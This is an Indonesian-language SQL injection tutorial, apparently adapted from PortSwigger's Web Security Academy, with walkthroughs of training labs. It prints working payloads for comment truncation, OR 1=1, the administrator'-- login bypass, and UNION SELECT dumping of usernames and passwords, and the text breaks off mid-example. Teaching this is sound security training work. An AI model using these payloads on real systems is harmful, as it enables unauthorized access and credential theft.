# SQL Injection — PortSwigger Web Security Academy

[🇮🇩 Baca dalam Bahasa Indonesia](sql-injection-id.md)

﷽

## Apa Itu SQL Injection?

![sql-injection](images/overview/sql-injection.png)

Jalur pembelajaran ini memperkenalkan SQL injection (SQLi), kerentanan web yang kritis. Anda akan belajar cara mendeteksi dan mengeksploitasi SQLi untuk mengungkap data tersembunyi dan memanipulasi perilaku aplikasi, serta teknik esensial untuk mengamankan aplikasi dari serangan SQLi.

## Apa Itu SQL Injection (SQLi)?

SQL injection (SQLi) adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu kueri yang dibuat aplikasi ke basis datanya. Hal ini dapat memungkinkan penyerang untuk melihat data yang biasanya tidak bisa mereka ambil. Data ini mungkin termasuk data milik pengguna lain, atau data apa pun yang bisa diakses oleh aplikasi. Dalam banyak kasus, penyerang bisa memodifikasi atau menghapus data ini, menyebabkan perubahan persisten pada konten atau perilaku aplikasi.

Dalam beberapa situasi, penyerang bisa mengeksploitasi serangan SQL injection untuk mengkompromikan server underlying atau infrastruktur back-end lainnya. Hal ini juga memungkinkan mereka melakukan serangan denial-of-service.

## Dampak Serangan SQL Injection yang Berhasil

Serangan SQL injection yang berhasil dapat mengakibatkan akses tidak sah ke data sensitif, seperti:

- Kata sandi.
- Detail kartu kredit.
- Informasi pribadi pengguna.

> **Catatan:** Serangan SQL injection telah digunakan dalam banyak pelanggaran data berprofil tinggi selama bertahun-tahun. Hal ini menyebabkan kerusakan reputasi dan denda regulasi. Dalam beberapa kasus, penyerang bisa mendapatkan akses backdoor persisten ke sistem organisasi, yang mengarah pada kompromi jangka panjang yang bisa tidak terdeteksi dalam periode yang lama.

## Cara Mendeteksi Kerentanan SQL Injection

Anda bisa mendeteksi SQL injection secara manual menggunakan serangkaian pengujian sistematis terhadap setiap titik masuk (entry point) di aplikasi. Untuk melakukannya, Anda biasanya akan mengirimkan:

- Tanda kutip tunggal `'` dan mencari error atau anomali lainnya
- Beberapa sintaks spesifik SQL yang mengevaluasi ke nilai dasar (asli) dari titik masuk, dan ke nilai yang berbeda, serta mencari perbedaan sistematis dalam respons aplikasi.
- Kondisi boolean seperti `OR 1=1` dan `OR 1=2`, dan mencari perbedaan dalam respons aplikasi.
- Payload yang dirancang untuk memicu jeda waktu (time delay) saat dieksekusi di dalam kueri SQL, dan mencari perbedaan waktu respons.
- Payload OAST yang dirancang untuk memicu interaksi jaringan out-of-band saat dieksekusi di dalam kueri SQL, dan memantau interaksi yang nehasil.

> **Catatan:** Alternatifnya, Anda bisa menemukan sebagian besar kerentanan SQL Injection dengan cepat dan andal menggunakan Burp Scanner (Burp Suite).

### SQL Injection di Berbagai Bagian Kueri

Kebanyakan kerentanan SQL injection terjadi di dalam klausa `WHERE` dari kueri `SELECT`. Kebanyakan penguji berpengalaman sudah familiar dengan tipe SQL injection ini.

Namun, kerentanan SQL injection bisa terjadi di lokasi mana pun dalam kueri, dan di berbagai tipe kueri. Beberapa lokasi umum lain di mana SQL injection muncul adalah:

- Di statement `UPDATE`, dalam nilai yang diupdate atau klausa `WHERE`.
- Di statement `INSERT`, dalam nilai yang disisipkan.
- Di statement `SELECT`, dalam nama tabel atau kolom.
- Di statement `SELECT`, dalam klausa `ORDER BY`.

## Mengambil Data Tersembunyi

Bayangkan aplikasi belanja yang menampilkan produk di kategori berbeda. Saat pengguna mengklik kategori *Gifts*, browser mereka meminta URL:

```url
https://insecure-website.com/products?category=Gifts
```

Hal ini menyebabkan aplikasi membuat kueri SQL untuk mengambil detail produk yang relevan dari basis data:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Kueri SQL ini meminta basis data untuk mengembalikan:

- semua detail `(*)`
- dari tabel `products`
- di mana kategori adalah `Gifts`
- dan `released` adalah `1`

> **Catatan:** Pembatasan `released = 1` digunakan untuk menyembunyikan produk yang belum dirilis. Kita bisa asumsikan untuk produk yang belum dirilis, `released = 0`.

### Mengambil Data Tersembunyi - Lanjutan

Aplikasi tidak mengimplementasikan pertahanan apa pun terhadap serangan SQL injection. Artinya penyerang bisa membuat serangan seperti berikut, misalnya:

```url
https://insecure-website.com/products?category=Gifts'--
```

Ini menghasilkan kueri SQL:

```SQL
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Perhatikan bahwa `--` adalah penanda komentar di SQL. Artinya sisa kueri diinterpretasikan sebagai komentar, sehingga efektif menghapusnya. Dalam contoh ini, artinya kueri tidak lagi menyertakan `AND released = 1`. Sebagai hasilnya, semua produk ditampilkan, termasuk yang belum dirilis.

Anda bisa menggunakan serangan serupa untuk menyebabkan aplikasi menampilkan semua produk di kategori mana pun, termasuk kategori yang tidak mereka ketahui:

```url
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Ini menghasilkan kueri SQL:

```SQL
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1--' AND released = 1
```

Kueri yang dimodifikasi mengembalikan semua item di mana `category` adalah `Gifts`, ATAU `1` sama dengan `1`. Karena `1=1` selalu benar, kueri mengembalikan semua item.

> **Peringatan:** Hati-hati saat menyuntikkan kondisi `OR 1=1` ke dalam kueri SQL. Meskipun terlihat tidak berbahaya di konteks yang Anda suntikkan, umum bagi aplikasi untuk menggunakan data dari satu permintaan di beberapa kueri berbeda. Jika kondisi Anda sampai ke statement `UPDATE` atau `DELETE`, misalnya, bisa mengakibatkan kehilangan data secara tidak sengaja.

#### Lab: Kerentanan SQL Injection di Klausa WHERE Memungkinkan Pengambilan Data Tersembunyi

Lab ini berisi kerentanan SQL injection di filter kategori produk. Saat pengguna memilih kategori, aplikasi menjalankan kueri SQL seperti berikut:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.1</summary>

Untuk menyelesaikan lab, lakukan serangan SQL injection yang menyebabkan aplikasi menampilkan satu atau lebih produk yang belum dirilis.

![akses lab 0.1](images/lab-0.1-retrieving-hidden-data/access-lab-0.1.png)

![Intercept 0.1](images/lab-0.1-retrieving-hidden-data/intercept-01.png)

![error 0.1](images/lab-0.1-retrieving-hidden-data/error-01.png)

![komentar 0.1](images/lab-0.1-retrieving-hidden-data/comment-01.png)

![true 0.1](images/lab-0.1-retrieving-hidden-data/true-01.png)

##### Tutorial

1. Gunakan Burp Suite untuk menyadap (intercept) dan mengirim permintaan ke Repeater
2. Modifikasi `'` dan `'--+` untuk melihat perilaku dari permintaan ke respons.
3. Modifikasi parameter `category`, beri nilai `+OR+1=1--`
4. Kirim permintaan, dan verifikasi bahwa respons sekarang berisi satu atau lebih produk yang belum dirilis.

##### Referensi

<details>
<summary>1. From SQL Injection to Retrieve Hidden Data! — Intigriti</summary>

Platform: YouTube
Topik: SQL Injection — Retrieving Hidden Data
Video: https://www.youtube.com/watch?v=alTceRdSxS0
Tujuan: Memahami bagaimana SQL injection bisa digunakan untuk mengambil data yang disembunyikan oleh kondisi kueri aplikasi.

</details>

<details>
<summary>2. SQL Injection Lab #1 — Rana Khalil</summary>

Topik: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
Video: https://www.youtube.com/watch?v=X1X1UdaC_90&t=1s
Tujuan: Mempelajari alur kerja praktis untuk mengidentifikasi dan memahami SQL injection di klausa WHERE.

</details>

<details>
<summary>3. SQL Injection Vulnerability in WHERE Clause — BlackArch/Burp by z3nsh3ll</summary>

Topik: SQL Injection — Retrieving Hidden Data
Video: https://www.youtube.com/watch?v=jTHz9Rz7oAo
Tujuan: Meninjau demonstrasi praktis melibatkan pengujian SQL injection dengan Burp Suite.

</details>

<details>
<summary>4. SQL Injection — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=U1tfxVGLPAs&t=1s
Tujuan: Referensi tambahan untuk belajar tentang SQL injection dan aplikasinya secara praktis.

</details>

</details>

## Mengubah Logika Aplikasi

Bayangkan aplikasi yang memungkinkan pengguna login dengan nama pengguna dan kata sandi. Jika pengguna mengirimkan nama pengguna `wiener` dan kata sandi `bluecheese`, aplikasi memeriksa kredensial dengan menjalankan kueri SQL berikut:

```SQL
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Jika kueri mengembalikan detail pengguna, login berhasil. Jika tidak, ditolak.

Dalam kasus ini, penyerang bisa login sebagai pengguna manapun tanpa perlu kata sandi. Mereka bisa melakukannya menggunakan urutan komentar SQL `--` untuk menghapus pemeriksaan kata sandi dari klausa `WHERE` kueri. Misalnya, mengirimkan nama pengguna `administrator'--` dan kata sandi kosong menghasilkan kueri berikut:

```SQL
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Kueri ini mengembalikan pengguna yang `username`-nya `administrator` dan berhasil login penyerang sebagai pengguna tersebut.

#### Lab: Kerentanan SQL Injection Memungkinkan Bypass Login

Untuk menyelesaikan lab, lakukan serangan SQL injection yang login ke aplikasi sebagai pengguna `administrator`.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.2</summary>

Lab ini berisi kerentanan SQL Injection di fungsi login.

![akses lab 0.2](images/lab-0.2-login-bypass/access-lab-0.2.png)

![pergi ke my account dan login 0.2](images/lab-0.2-login-bypass/go-my-account-and-login-0.2.png)

![kirim repeater 0.2](images/lab-0.2-login-bypass/repeater-0.2.png)

![error 0.2](images/lab-0.2-login-bypass/error-0.2.png)

![forward 0.2](images/lab-0.2-login-bypass/forward-0.2.png)

![my account get login administrator 0.2](images/lab-0.2-login-bypass/my-account-get-login-administrator-0.2.png)

##### Tutorial

1. Gunakan Burp Suite untuk menyadap dan mengirim ke repeater permintaan login.
2. Lihat dan modifikasi parameter `username`, beri input `administrator'` untuk melihat respons error `500` status code behaviour.
3. Modifikasi di forward dari intercept, beri nilai `administrator'--`
4. Berhasil login dengan akun `administrator`.

##### Referensi

<details>
<summary>5. SQL Injection: Bypassing Login Authentication | PortSwigger (OLD) — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=4FGkpyYYfCs&t=1s
Tujuan: Dalam episode ini, kita membawa SQL injection melampaui ekstraksi data dan menggunakannya untuk melewati autentikasi sepenuhnya. Dengan menyadap permintaan login di Burp Suite dan memanipulasi field username, kita login sebagai akun administrator — tanpa pernah mengetahui, atau memerlukan, kata sandi yang benar.

</details>

<details>
<summary>6. SQL Injection - Lab #2 SQL injection vulnerability allowing login bypass — Rana Khalil</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=ML3aGaloczI&t=1s
Tujuan: Dalam video ini, kita membahas lab #2 di trek SQL injection di Web Security Academy. Lab ini berisi kerentanan SQL injection di fungsi login. Untuk menyelesaikan lab, kita melakukan serangan SQL injection yang melewati autentikasi dan memungkinkan kita login ke aplikasi sebagai pengguna administrator.

</details>

<details>
<summary> 7. SQL Injection Vulnerability Allowing Login Bypass — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=mS0A9e_oy8A&t=1s
Tujuan: Dalam video ini kita menyelesaikan lab akademi Burp Suite berjudul 'SQL injection vulnerability allowing login bypass'

</details>

</details>

## Serangan SQL Injection UNION

Saat aplikasi rentan terhadap SQL injection, dan hasil kueri dikembalikan dalam respons aplikasi, Anda bisa menggunakan kata kunci `UNION` untuk mengambil data dari tabel lain dalam basis data. Ini umum disebut sebagai SQL injection UNION Attack.

Kata kunci `UNION` memungkinkan Anda mengeksekusi satu atau lebih kueri `SELECT` tambahan dan menempelkan hasilnya ke kueri asli. Contoh:

```SQL
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Kueri SQL ini mengembalikan satu set hasil dengan dua kolom, berisi nilai dari kolom `a` dan `b` di `table1` dan kolom `c` dan `d` di `table2`.

### Serangan SQL Injection UNION - Lanjutan

Agar kueri `UNION` berfungsi, dua persyaratan utama harus terpenuhi:

- Kueri individual harus mengembalikan jumlah kolom yang sama.
- Tipe data di setiap kolom harus kompatibel antara kueri individual.

Untuk melakukan serangan SQL injection UNION, pastikan serangan Anda memenuhi kedua persyaratan ini. Biasanya melibatkan penentuan:

- Berapa banyak kolom yang dikembalikan dari kueri asli.
- Kolom mana yang dikembalikan dari kueri asli memiliki tipe data yang cocok untuk menampung hasil dari kueri yang disuntikkan.

### Menentukan Jumlah Kolom yang Diperlukan

Saat Anda melakukan serangan SQL injection UNION, ada dua metode efektif untuk menentukan berapa kolom yang dikembalikan dari kueri asli.

Satu metode melibatkan injeksi serangkaian klausa `ORDER BY` dan menaikkan indeks kolom yang ditentukan hingga terjadi error. Misalnya, jika titik injeksi adalah string yang dikutip di dalam klausa `WHERE` dari kueri asli, Anda akan mengirimkan:

```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
dst.
```

Serangkaian payload ini memodifikasi kueri asli untuk mengurutkan hasil berdasarkan kolom berbeda di set hasil. Kolom dalam klausa `ORDER BY` bisa ditentukan oleh indeksnya, jadi Anda tidak perlu tahu nama kolom apa pun di set hasil. Basis data mengembalikan error, seperti:

```SQL
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

Aplikasi mungkin benar-benar mengembalikan error basis data di respons HTTP-nya, tapi mungkin juga mengeluarkan respons error generik. Dalam kasus lain, mungkin hanya mengembalikan tidak ada hasil sama sekali. Bagaimanapun, selama Anda bisa mendeteksi perbedaan di respons, Anda bisa menyimpulkan berapa kolom yang dikembalikan dari kueri.

#### Menentukan Jumlah Kolom yang Diperlukan - Lanjutan

Metode kedua melibatkan pengiriman serangkaian payload `UNION SELECT` yang menentukan jumlah nilai null yang berbeda:

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
dst.
```

Jika jumlah null tidak cocok dengan jumlah kolom, basis data mengembalikan error, seperti:

```SQL
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Kita menggunakan `NULL` sebagai nilai yang dikembalikan dari kueri `SELECT` yang disuntikkan karena tipe data di setiap kolom harus kompatibel antara kueri asli dan yang disuntikkan. `NULL` bisa dikonversi ke setiap tipe data umum, jadi ini memaksimalkan peluang payload berhasil saat jumlah kolom sudah benar.

Seperti teknik `ORDER BY`, aplikasi mungkin benar-benar mengembalikan error basis data di respons HTTP-nya, tapi mungkin mengembalikan error generik atau hanya mengembalikan tidak ada hasil. Saat jumlah null cocok dengan jumlah kolom, basis data mengembalikan baris tambahan di set hasil, berisi nilai null di setiap kolom. Efek pada respons HTTP bergantung pada kode aplikasi. Jika Anda beruntung, Anda akan melihat konten tambahan di dalam respons, seperti baris ekstra pada tabel HTML. Jika tidak, nilai null mungkin memicu error berbeda, seperti `NullPointerException`. Dalam kasus terburuk, respons mungkin terlihat sama seperti respons yang disebabkan oleh jumlah null yang salah. Ini akan membuat metode ini tidak efektif.

##### Lab: Serangan SQL Injection UNION, Menentukan Jumlah Kolom yang Dikembalikan oleh Kueri

Lab ini berisi kerentanan SQL injection di filter kategori produk. Hasil dari kueri dikembalikan di respons aplikasi, jadi Anda bisa menggunakan serangan UNION untuk mengambil data dari tabel lain. Langkah pertama dari serangan seperti itu adalah menentukan jumlah kolom yang dikembalikan oleh kueri. Anda kemudian akan menggunakan teknik ini di lab selanjutnya untuk membangun serangan penuh.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.3</summary>

Untuk menyelesaikan lab, tentukan jumlah kolom yang dikembalikan oleh kueri dengan melakukan serangan SQL injection UNION yang mengembalikan baris tambahan berisi nilai null.

![akses labs 0.3](images/lab-0.3-union-column-count/access-lab-0.3.png)

![pergi ke parameter pencarian Pets 0.3](images/lab-0.3-union-column-count/go-to-search-parameter-Pets-0.3.png)

![intercept 0.3](images/lab-0.3-union-column-count/intercept-0.3.png)

![error 0.3](images/lab-0.3-union-column-count/error-0.3.png)

![komentar 0.3](images/lab-0.3-union-column-count/comments-0.3.png)

![ORDER BY 1 0.3](images/lab-0.3-union-column-count/ORDER-BY-1-0.3.png)

![ORDER BY 2 0.3](images/lab-0.3-union-column-count/ORDER-BY-2-0.3.png)

![ORDER BY 3 0.3](images/lab-0.3-union-column-count/ORDER-BY-3-0.3.png)

![Error di ORDER BY 4 0.3](images/lab-0.3-union-column-count/Error-in-ORDER-BY-4-0.3.png)

![ORDER BY memberikan tabel select terdeteksi di 3 0.3](images/lab-0.3-union-column-count/ORDER-BY-give-a-detected-select-table-in-3-0.3.png)

![tambah representasi + 0.3](images/lab-0.3-union-column-count/add-+-repersentation-0.3.png)

![ubah NULL mendapat respons 200 0.3](images/lab-0.3-union-column-count/change-NULL-0.3.png)

![Berhasil UNION Attack menentukan jumlah kolom oleh kueri 0.3](images/lab-0.3-union-column-count/success-0.3.png)


##### Tutorial

1. **Sadap Permintaan**  
   Gunakan Burp Suite untuk menyadap permintaan yang berisi `category=Pets`, lalu kirim ke Repeater.
2. **Uji SQL Injection**  
   Modifikasi parameter `category` untuk memeriksa error SQL dan bandingkan respons.

   ```sql
   category='
   category='--
   ```
3. **Tentukan Jumlah Kolom**  
   Gunakan `ORDER BY` dengan nomor kolom yang meningkat hingga error terjadi.

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ' ORDER BY 4--
   ```
4. **Uji UNION SELECT dengan Nilai NULL**  
   Uji jumlah `NULL` yang berbeda untuk menentukan jumlah kolom yang benar.

   ```sql
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   ```
5. **Uji Representasi NULL Alternatif**  
   Uji representasi alternatif yang ditunjukkan di screenshot.

   ```sql
   ' UNION SELECT NULL,+NULL,+NULL--
   ```
6. **Verifikasi Respons**  
   Periksa respons HTTP `200 OK` dan bandingkan body respons dengan respons normal untuk menentukan apakah kueri UNION diterima.


##### Referensi

<details>
<summary>8. SQL Injection - Lab #3 SQLI UNION attack determining the number of columns returned by query — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=umXGHbEyW5I
Tujuan: Lab ini berisi kerentanan SQL injection di field filter kategori produk. Kerentanan ini bisa dieksploitasi menggunakan serangan UNION untuk mengambil data dari tabel lain. Untuk menyelesaikan lab, kita melakukan serangan SQL injection yang menentukan jumlah kolom yang dikembalikan oleh kueri. Ini adalah langkah pertama dari serangan SQL injection UNION. Kita akan menggunakan teknik ini di lab selanjutnya untuk membangun serangan penuh.

</details>

<details>
<summary> 9. SQL UNION Attack - Determining the Number of Columns Returned by Query — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=mS0A9e_oy8A&t=1s
Tujuan: Lab ini disediakan oleh burp suite web security academy untuk belajar serangan SQL injection union injection. Tugasnya adalah 'menentukan jumlah kolom yang dikembalikan oleh kueri'. 
</details>

</details>


#### Sintaks Khusus Basis Data

Di Oracle, setiap kueri `SELECT` harus menggunakan kata kunci `FROM` dan menentukan tabel yang valid. Ada tabel bawaan di Oracle bernama `dual` yang bisa digunakan untuk tujuan ini. Jadi kueri yang disuntikkan di Oracle harus terlihat seperti:

```SQL
' UNION SELECT NULL FROM DUAL--
```

Payload yang dijelaskan menggunakan urutan komentar double-dash `--` untuk mengomentari sisa kueri asli setelah titik injeksi. Di MySQL, urutan double-dash harus diikuti spasi. Alternatifnya, karakter hash `#` bisa digunakan untuk mengidentifikasi komentar.

> **Catatan:** Untuk detail lebih lanjut tentang sintaks khusus basis data, lihat [SQL Injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Menemukan Kolom dengan Tipe Data Berguna

Serangan SQL injection UNION memungkinkan Anda mengambil hasil dari kueri yang disuntikkan. Data menarik yang ingin Anda ambil biasanya berupa string. Artinya Anda perlu menemukan satu atau lebih kolom di hasil kueri asli yang tipe datanya adalah, atau kompatibel dengan, data string.

Setelah Anda menentukan jumlah kolom yang diperlukan, Anda bisa memeriksa setiap kolom untuk menguji apakah ia bisa menampung data string. Anda bisa mengirimkan serangkaian payload `UNION SELECT` yang menempatkan nilai string ke setiap kolom secara bergantian. Misalnya, jika kueri mengembalikan empat kolom, Anda akan mengirimkan:

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Jika tipe data kolom tidak kompatibel dengan data string, kueri yang disuntikkan akan menyebabkan error basis data, seperti:

```SQL
Conversion failed when converting the varchar value 'a' to data type int.
```

Jika error tidak terjadi, dan respons aplikasi berisi konten tambahan termasuk nilai string yang disuntikkan, maka kolom yang relevan cocok untuk mengambil data string.

##### Lab: Serangan SQL Injection UNION, Menemukan Kolom yang Berisi Teks

Lab ini berisi kerentanan SQL injection di filter kategori produk. Hasil dari kueri dikembalikan di respons aplikasi, jadi Anda bisa menggunakan serangan UNION untuk mengambil data dari tabel lain. Untuk membangun serangan seperti itu, Anda pertama perlu menentukan jumlah kolom yang dikembalikan oleh kueri. Anda bisa melakukannya menggunakan teknik yang Anda pelajari di lab sebelumnya. Langkah selanjutnya adalah mengidentifikasi kolom yang kompatibel dengan data string.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.4</summary>

Lab akan memberikan nilai acak yang perlu Anda buat muncul di hasil kueri. Untuk menyelesaikan lab, lakukan serangan SQL injection UNION yang mengembalikan baris tambahan berisi nilai yang disediakan. Teknik ini membantu Anda menentukan kolom mana yang kompatibel dengan data string.

![akses labs 0.4](images/lab-0.4-union-text-column/access-lab-0.4.png)

![Buka parameter Gifts 0.4](images/lab-0.4-union-text-column/Open-Gifts-parameter-0.4.png)

![intercept dan repeater 0.4](images/lab-0.4-union-text-column/intercept-and-repeater-0.4.png)

![error 0.4](images/lab-0.4-union-text-column/error-0.4.png)

![komentar 0.4](images/lab-0.4-union-text-column/comments-0.4.png)

![ORDER BY 1 0.4](images/lab-0.4-union-text-column/ORDER-BY-1-0.4.png)

![ORDER BY 2 0.4](images/lab-0.4-union-text-column/ORDER-BY-2-0.4.png)

![ORDER BY 3 0.4](images/lab-0.4-union-text-column/ORDER-BY-3-0.4.png)

![Error di ORDER BY 4 0.4](images/lab-0.4-union-text-column/Error-in-ORDER-BY-4-0.4.png)

![Berikan UNION SELECT 1,2,3 dan ubah nilai NULL NULL NULL 0.4](images/lab-0.4-union-text-column/change-NULL-0.4.png)

![di respons berhasil mendapatkan info basis data mengambil string: 'AAAA' 0.4](images/lab-0.4-union-text-column/response-success-0.4.png)

##### Tutorial

1. **Sadap Permintaan**  
   Gunakan Burp Suite untuk menyadap permintaan yang berisi `category=Gifts`, lalu kirim ke Repeater.
2. **Uji SQL Injection**  
   Modifikasi parameter `category` untuk memeriksa error SQL dan bandingkan respons.

   ```sql
   category='
   category='--
   ```
3. **Tentukan Jumlah Kolom**  
   Gunakan `ORDER BY` dengan nomor kolom yang meningkat hingga error terjadi.

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ' ORDER BY 4--
   ```
4. **Uji UNION SELECT**  
   Karena `ORDER BY 4` menghasilkan error sedangkan `ORDER BY 3` berhasil, uji kueri UNION dengan tiga kolom.

   ```sql
   ' UNION SELECT NULL,NULL,NULL--
   ```
5. **Identifikasi Kolom yang Ditampilkan**  
   Ganti nilai `NULL` dengan string atau angka yang bisa diidentifikasi untuk menentukan kolom mana yang tercermin di respons.

   ```sql
   '+UNION+SELECT+NULL,"AAAA",NULL--
   ```
6. **Verifikasi Hasil**  
   Periksa respons untuk HTTP `200 OK` dan cari nilai tercermin, seperti `"AAAA"`, di body respons. Ini mengonfirmasi bahwa kueri UNION diproses dan mengidentifikasi kolom yang ditampilkan.

##### Referensi

<details>
<summary>10. SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=SGBTC5D7DTs
Tujuan: Lab ini berisi kerentanan SQL injection di filter kategori produk. Untuk menyelesaikan lab, kita melakukan serangan SQL injection yang mengembalikan baris tambahan berisi nilai yang disediakan. Teknik ini membantu kita menentukan kolom mana yang kompatibel dengan data string.

</details>

<details>
<summary> 11. SQL Union Attack - Finding a Column Containing Text — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=itECw0Yn8tQ
Tujuan: Lab ini disediakan oleh Burp Web Security Academy. Kita menyelesaikan tantangan 'menemukan kolom yang berisi teks'
</details>

</details>

### Menggunakan Serangan SQL Injection UNION untuk Mengambil Data Menarik

Saat Anda sudah menentukan jumlah kolom yang dikembalikan kueri asli dan menemukan kolom mana yang bisa menampung data string, Anda siap mengambil data menarik.

Asumsikan bahwa:

- Kueri asli mengembalikan dua kolom, keduanya bisa menampung data string.
- Titik injeksi adalah string yang dikutip di dalam klausa `WHERE`.
- Basis data berisi tabel bernama `users` dengan kolom `username` dan `password`

Dalam contoh ini, Anda bisa mengambil isi tabel `users` dengan mengirimkan input:

```sql
' UNION SELECT username, password FROM users--
```

Untuk melakukan serangan ini, Anda perlu tahu ada tabel bernama `users` dengan dua kolom bernama `username` dan `password`. Tanpa info ini, Anda harus menebak nama tabel dan kolom. Semua basis data modern menyediakan cara untuk memeriksa struktur basis data, dan menentukan tabel dan kolom apa yang mereka miliki.

##### Lab: Serangan SQL Injection UNION, Mengambil Data dari Tabel Lain

Lab ini berisi kerentanan SQL Injection di filter kategori produk. Hasil dari kueri dikembalikan di respons aplikasi, jadi Anda bisa menggunakan serangan UNION untuk mengambil data dari tabel lain. Untuk membangun serangan seperti itu, Anda perlu menggabungkan beberapa teknik yang Anda pelajari di lab sebelumnya.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.5</summary>

Basis data berisi tabel berbeda bernama `users`, dengan kolom bernama `username` dan `password`.

Untuk menyelesaikan lab, lakukan serangan SQL injection UNION yang mengambil semua nama pengguna dan kata sandi, dan gunakan informasi untuk login sebagai pengguna `administrator`.

![akses labs 0.5](images/lab-0.5-union-retrieve-data/access-lab-0.5.png)

![Buka parameter Gifts 0.5](images/lab-0.5-union-retrieve-data/Open-Gifts-parameter-0.5.png)

![intercept dan repeater 0.5](images/lab-0.5-union-retrieve-data/intercept-and-repeater-0.5.png)

![error 0.5](images/lab-0.5-union-retrieve-data/error-0.5.png)

![komentar 0.5](images/lab-0.5-union-retrieve-data/comments-0.5.png)

![ORDER BY 1 0.5](images/lab-0.5-union-retrieve-data/ORDER-BY-1-0.5.png)

![ORDER BY 2 0.5](images/lab-0.5-union-retrieve-data/ORDER-BY-2-0.5.png)

![Error di ORDER BY 3 0.5](images/lab-0.5-union-retrieve-data/error-in-ORDER-BY-3-0.5.png)

![Berikan UNION SELECT 1,2 dan ubah nilai NULL NULL 0.5](images/lab-0.5-union-retrieve-data/change-NULL-0.5.png)

![ubah input tabel string 'a','b' 0.5](images/lab-0.5-union-retrieve-data/change-tables-input-string-0.5.png)

![input statement untuk mengambil username dan password 0.5](images/lab-0.5-union-retrieve-data/statments-username-password-0.5.png)

![buka respons 0.5](images/lab-0.5-union-retrieve-data/open-respone-0.5.png)

![salin respons tempel ke URL di browser 0.5](images/lab-0.5-union-retrieve-data/copy-paste-url-0.5.png)

![username di respons frontend atau respons get 200 dan leak](images/lab-0.5-union-retrieve-data/leak-0.5.png)

![login username administrator 0.5](images/lab-0.5-union-retrieve-data/login-0.5.png)

![berhasil akses administrator 0.5](images/lab-0.5-union-retrieve-data/success-login-0.5.png)

##### Tutorial

1. Buka Burpsuite dan sadap parameter `Gifts`
2. Sadap permintaan dan kirim ke repeater
3. Modifikasi untuk melihat perilaku permintaan kirim input `'` mendapat respons error kode 500.
4. Modifikasi permintaan kirim input `'--` untuk komentar mendapat respons 200 sukses.
5. Tentukan kolom yang rentan digunakan kueri dengan `ORDER BY`

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
6. Berhasil mendeteksi error kolom di `ORDER BY 3`
7. Tentukan tipe data kolom yang digunakan `UNION SELECT`
8. Karena statement kolom ditemukan di `3` Coba `UNION SELECT` ini:

```SQL
' UNION SELECT 1,2--
' UNION SELECT NULL,NULL--
' UNION SELECT 'A','B'--
```
9. Kirim UNION SELECT untuk keduanya tipe data string `'A' and 'b'` untuk validasi tabel.
10. Berikan nilai Statement untuk mengambil data `username` dan `password` dari tabel lain:

```sql
' UNION SELECT username, password from users--
```
11. Di respons HTTP dan frontend berhasil mendapatkan `username` dan `password` yang bocor dari tabel.

12. Coba login pengguna `administrator`

##### Referensi

<details>
<summary> 12. UNION SQL Injection to Extract Data From Other Tables! — Intigriti</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=PLa_oQtMl1U
Tujuan: Dalam video ini, kita akan melihat kueri UNION SELECT untuk mengekstrak data dari tabel basis data lain. 
</details>

<details>
<summary>13. SQL Injection - Lab #5 SQL injection UNION attack, retrieving data from other tables — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=6Dsj5SqR944
Tujuan: Lab ini berisi kerentanan SQL injection di field kategori produk. Untuk menyelesaikan lab, kita melakukan serangan UNION based SQL injection yang mengambil username dan password pengguna aplikasi.

</details>

<details>
<summary> 14. SQL Union Attack Retrieving Data From Other Tables — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=ushDHoJbwEc
Tujuan: Dalam video ini kita menyelesaikan lab Burp Suite Web Academy - "SQL Union Attack Retrieving Data From Other Tables"
</details>

</details>

### Mengambil Beberapa Nilai dalam Satu Kolom

Dalam beberapa kasus, kueri di contoh sebelumnya mungkin hanya mengembalikan satu kolom.

Anda bisa mengambil beberapa nilai bersama dalam kolom tunggal ini dengan menggabungkan (concatenate) nilainya. Anda bisa menyertakan pemisah untuk membedakan nilai yang digabungkan. Misalnya, di Oracle Anda bisa mengirimkan input:

```sql
` UNION SELECT username || '~' || password FROM users--
